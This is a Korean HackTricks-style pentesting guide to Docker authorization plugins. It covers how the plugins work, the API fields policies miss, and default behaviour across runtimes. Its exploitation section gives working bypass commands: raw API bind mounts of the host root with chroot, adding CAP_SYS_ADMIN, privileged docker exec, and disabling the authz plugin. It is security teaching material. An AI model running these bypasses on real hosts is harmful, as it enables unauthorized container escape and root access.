# 런타임 권한 부여 플러그인

{{#include ../../../banners/hacktricks-training.md}}

## 개요

런타임 권한 부여 플러그인은 호출자가 특정 데몬 동작을 수행할 수 있는지를 결정하는 추가 정책 계층이다. Docker가 전형적인 예다. 기본적으로 Docker 데몬과 통신할 수 있는 사람은 사실상 데몬을 광범위하게 제어할 수 있다. 권한 부여 플러그인은 인증된 사용자와 요청된 API 작업을 검사한 뒤 정책에 따라 요청을 허용하거나 거부하여 그 모델을 좁히려 한다.

이 주제가 별도의 페이지를 필요로 하는 이유는 공격자가 이미 Docker API에 접근하거나 `docker` 그룹의 사용자 계정을 가진 경우 공격 모델이 달라지기 때문이다. 그런 환경에서는 더 이상 "데몬에 도달할 수 있나?"만이 아니라 "데몬이 권한 부여 계층으로 보호되어 있는가? 만약 그렇다면, 그 계층은 처리되지 않은 엔드포인트, 취약한 JSON 파싱, 또는 플러그인 관리 권한을 통해 우회될 수 있는가?"라는 질문이 생긴다.

## 작동 방식

요청이 Docker 데몬에 도달하면 권한 부여 하위시스템은 요청 컨텍스트를 하나 이상의 설치된 플러그인에 전달할 수 있다. 플러그인은 인증된 사용자 신원, 요청 세부사항, 선택된 헤더, 그리고 콘텐츠 타입이 적절한 경우 요청 또는 응답 본문의 일부를 확인한다. 여러 플러그인을 체인으로 연결할 수 있으며, 모든 플러그인이 요청을 허용해야만 접근이 허가된다.

이 모델은 강력해 보이지만, 안전성은 전적으로 정책 작성자가 API를 얼마나 완전히 이해했는지에 달려 있다. `docker run --privileged`를 차단하지만 `docker exec`를 무시하거나 최상위 `Binds` 같은 대체 JSON 키를 놓치거나 플러그인 관리를 허용하는 플러그인은 제약이 있는 것처럼 보이게 만들지만 실제로는 직접적인 권한 상승 경로를 열어둘 수 있다.

## 일반적인 플러그인 대상

정책 검토에서 중요한 영역은:

- 컨테이너 생성 엔드포인트
- `HostConfig` 필드들, 예: `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, 및 네임스페이스 공유 옵션
- `docker exec` 동작
- 플러그인 관리 엔드포인트
- 의도된 정책 모델 밖에서 간접적으로 런타임 동작을 유발할 수 있는 모든 엔드포인트

역사적으로 Twistlock의 `authz` 플러그인과 `authobot` 같은 단순한 교육용 플러그인들은 정책 파일과 코드 경로가 엔드포인트-동작 매핑이 실제로 어떻게 구현되는지를 보여주었기 때문에 이 모델을 연구하기 쉽게 만들었다. 평가 작업에서는 중요한 교훈이 정책 작성자가 가장 눈에 띄는 CLI 명령뿐 아니라 전체 API 표면을 이해해야 한다는 것이다.

## 악용

첫 번째 목표는 실제로 무엇이 차단되는지를 파악하는 것이다. 데몬이 동작을 거부하면, 오류는 종종 플러그인 이름을 leaks 하여 사용 중인 제어를 식별하는 데 도움이 된다:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
더 광범위한 엔드포인트 프로파일링이 필요하다면, `docker_auth_profiler` 같은 도구가 유용합니다. 이러한 도구는 plugin이 실제로 허용하는 API 경로와 JSON 구조를 확인하는 반복 작업을 자동화해 주기 때문입니다.

환경이 커스텀 plugin을 사용하고 API와 상호작용할 수 있다면, 객체의 어떤 필드가 실제로 필터링되는지 열거하세요:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
이러한 검사는 많은 권한 부여 실패가 개념적이라기보다는 필드별(특정 필드에만 해당)인 경우가 많기 때문에 중요합니다. 플러그인은 CLI 패턴을 거부할 수 있지만 동등한 API 구조를 완전히 차단하지 못할 수 있습니다.

### 전체 예시: `docker exec`가 컨테이너 생성 후 권한을 추가함

privileged 컨테이너 생성을 차단하지만 unconfined 컨테이너 생성과 `docker exec`를 허용하는 정책은 여전히 우회될 수 있습니다:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
데몬이 두 번째 단계를 허용하면, 사용자는 정책 작성자가 제약되었다고 믿었던 컨테이너 내부에서 특권을 가진 대화형 프로세스를 회복하게 된다.

### 전체 예시: Bind Mount Through Raw API

일부 취약한 정책은 하나의 JSON 형태만 검사한다. 루트 파일시스템의 bind mount가 일관되게 차단되지 않으면, 호스트를 여전히 마운트할 수 있다:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
동일한 개념은 `HostConfig` 아래에서도 나타날 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
영향은 full host filesystem escape입니다. 흥미로운 점은 이 우회가 kernel bug가 아니라 incomplete policy coverage에서 비롯된다는 것입니다.

### 전체 예: Unchecked Capability Attribute

정책이 capability-related attribute를 필터링하는 것을 잊으면, 공격자는 위험한 capability를 다시 획득하는 container를 생성할 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
일단 `CAP_SYS_ADMIN` 또는 이와 유사하게 강력한 capability가 존재하면, [capabilities.md](protections/capabilities.md)와 [privileged-containers.md](privileged-containers.md)에 설명된 많은 breakout techniques에 접근할 수 있다.

### 전체 예: Disabling The Plugin

plugin-management operations가 허용된다면, 가장 깔끔한 bypass는 제어를 완전히 끄는 것일 수 있다:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
이는 control-plane 수준의 정책 실패입니다. authorization 레이어는 존재하지만, 권한을 제한하려던 사용자가 여전히 이를 비활성화할 권한을 가지고 있습니다.

## Checks

이 명령들은 정책 레이어가 존재하는지, 그리고 그것이 완전한지 아닌지(피상적인지) 확인하는 데 목적이 있습니다.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
여기서 주목할 점:

- 플러그인 이름이 포함된 거부 메시지는 권한 부여(authorization) 계층의 존재를 확인해 주며 종종 정확한 구현을 드러낸다.
- 공격자가 볼 수 있는 플러그인 목록만으로도 비활성화(disable)나 재구성(reconfigure) 작업이 가능한지 확인하기에 충분할 수 있다.
- 명백한 CLI 동작만 차단하고 원시 API 요청(raw API requests)은 차단하지 않는 정책은 입증될 때까지 우회 가능한 것으로 간주해야 한다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화되어 있지 않음 | authorization plugin이 구성되지 않으면 데몬 접근은 사실상 전부 허용 또는 전부 차단(all-or-nothing)이다 | 불완전한 플러그인 정책, 허용 목록(allowlists) 대신 차단 목록(blacklists) 사용, 플러그인 관리 허용, 필드 수준의 맹점 |
| Podman | 직접적인 대응물이 일반적이지 않음 | Podman은 일반적으로 Docker 스타일의 authz 플러그인보다 Unix 권한, rootless 실행, API 노출 결정에 더 의존한다 | root 권한 Podman API를 광범위하게 노출, 취약한 소켓 권한 |
| containerd / CRI-O | 제어 모델이 다름 | 이들 런타임은 보통 Docker authz 플러그인보다는 소켓 권한, 노드 신뢰 경계, 상위 레이어 오케스트레이터 제어에 의존한다 | 소켓을 워크로드에 마운트, 노드 로컬 신뢰 가정 약함 |
| Kubernetes | API-server와 kubelet 레이어에서 authn/authz를 사용하며 Docker authz 플러그인을 사용하지 않음 | Cluster RBAC와 admission 컨트롤이 주요 정책 계층이다 | 범위가 너무 넓은 RBAC, 취약한 admission 정책, kubelet 또는 런타임 API를 직접 노출 |
